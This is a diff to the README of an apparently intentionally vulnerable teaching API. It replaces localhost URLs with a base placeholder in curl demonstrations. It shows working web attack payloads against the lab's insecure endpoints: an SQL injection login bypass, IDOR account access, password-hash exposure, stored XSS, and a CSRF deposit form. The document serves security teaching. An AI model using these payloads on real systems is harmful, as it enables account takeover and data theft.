@@ -97,10 +97,11 @@ Findings:
 
 Next, We'll take a look at some curls and their effects on insecure and secure versions of our endpoints, We'll talk about the expected and actual behavior along with the impact.
 
+NOTE: in this instance **<BASE>** == http://localhost:8000, but this may change depending on how you run the database
 ## SQL Injection (Auth Bypass)
 
 **Insecure (vulnerable)**  
-curl -i -X POST "http://localhost:8000/api/auth/insecure/login" \
+curl -i -X POST "**<BASE>**/api/auth/insecure/login" \
   -H "Content-Type: application/json" \
   --data-raw '{"username":"x'\'' OR '\''1'\''='\''1'--","password":"whatever"}'
 
@@ -108,7 +109,7 @@ curl -i -X POST "http://localhost:8000/api/auth/insecure/login" \
 **Actual (insecure):** 200 OK, logged in as the first user `ahmed@example.com` even with invalid credentials. This proves the query was concatenated and injectable.
 
 **Secure version**  
-curl -i -X POST "http://localhost:8000/api/auth/login" \
+curl -i -X POST "**<BASE>**/api/auth/login" \
   -H "Content-Type: application/json" \
   -d '{"email":"x'\'' OR '\''1'\''='\''1","password":"whatever"}'
 
@@ -118,25 +119,25 @@ curl -i -X POST "http://localhost:8000/api/auth/login" \
 ## IDOR (account exposures)
 
 **Insecure (no auth)**  
-curl -i "http://localhost:8000/api/accounts/insecure/1"
+curl -i "**<BASE>**/api/accounts/insecure/1"
 
 **Expected (insecure):** 200 OK with full account data for user 1  
 **Actual:** as expected, account data returned with no auth or ownership check
 
 **Secure (token required)**  
-curl -i "http://localhost:8000/api/accounts/1"
+curl -i "**<BASE>**/api/accounts/1"
 
 **Actual:** 401 Unauthorized, access blocked because no valid token was provided
 
 ## Password exposure (insecure listing)
 
 **Insecure**  
-curl -s "http://localhost:8000/api/auth/insecure/users" | jq .
+curl -s "**<BASE>**/api/auth/insecure/users" | jq .
 
 **Result:** returns user records including password or hash. Some are bcrypt hashes from seed data, others are plaintext from insecure registration.
 
 **Secure listing**  
-curl -s "http://localhost:8000/api/users" | jq .
+curl -s "**<BASE>**/api/users" | jq .
 
 **Result:** returns only `{ userid, name, email, created }`. No password or hash field is exposed.
 
@@ -145,17 +146,17 @@ curl -s "http://localhost:8000/api/users" | jq .
 ## Stored XSS (user name field)
 
 **Insecure registration**  
-curl -i -X POST "http://localhost:8000/api/auth/insecure/register" \
+curl -i -X POST "**<BASE>**/api/auth/insecure/register" \
   -H "Content-Type: application/json" \
   -d '{"name":"<script>alert(1)</script>","email":"xss@test.local","password":"Password123!"}'
 
 Then:  
-curl -s "http://localhost:8000/api/auth/insecure/users" | jq .
+curl -s "**<BASE>**/api/auth/insecure/users" | jq .
 
 **Result:** the stored name contains `<script>alert(1)</script>` raw. If rendered on a frontend, it executes.
 
 **Secure registration**  
-curl -i -X POST "http://localhost:8000/api/auth/register" \
+curl -i -X POST "**<BASE>**/api/auth/register" \
   -H "Content-Type: application/json" \
   -d '{"name":"<script>alert(1)</script>","email":"xss2@test.local","password":"Password123!"}'
 
@@ -165,7 +166,7 @@ curl -i -X POST "http://localhost:8000/api/auth/register" \
 
 **Insecure PoC (attacker page)**
 
-<form method="POST" action="http://localhost:8000/api/transactions/deposit">
+<form method="POST" action="**<BASE>**/api/transactions/deposit">
   <input type="hidden" name="accountid" value="3" />
   <input type="hidden" name="amount" value="1000" />
   <input type="submit" value="Pay" />
